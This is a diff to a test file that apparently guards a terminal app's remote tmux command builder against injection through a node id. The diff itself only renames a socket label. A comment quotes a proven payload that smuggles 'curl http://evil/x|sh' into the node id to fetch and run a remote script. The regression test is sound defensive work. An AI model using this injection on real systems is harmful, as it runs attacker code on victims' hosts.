@@ -18,7 +18,7 @@ import { remoteTmuxPathPrologue } from '../../shared/ssh'
  * a cloned/shared repo and is written on remote hosts — i.e. it is attacker-supplied data. The
  * proven payload was:
  *
- *   tmux -L nodeterm-rmt new-session -A -e NODETERM_HOOK_ENDPOINT=/ep \
+ *   tmux -L node-terminal new-session -A -e NODETERM_HOOK_ENDPOINT=/ep \
  *     -e NODETERM_NODE_ID=n1;curl${IFS}http://evil/x|sh;# … -s 'nt-n1' -c '/home/u'
  *
  * where the `;` ends the tmux command and the rest runs as the SSH user the moment the victim
@@ -166,7 +166,7 @@ describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never comma
     // and the command still carries exactly one tmux invocation with the expected shape (the
     // PATH prologue + tmux-missing fallback now precede it, so the head is indexOf, not slice).
     const t = argv.lastIndexOf('tmux') // the guard's `command -v tmux` also carries the word
-    expect(argv.slice(t, t + 3)).toEqual(['tmux', '-L', 'nodeterm-rmt'])
+    expect(argv.slice(t, t + 3)).toEqual(['tmux', '-L', 'node-terminal'])
     expect(argv.filter((a) => a === 'new-session')).toHaveLength(1)
     expect(argv).toContain('nt-n1')
   })
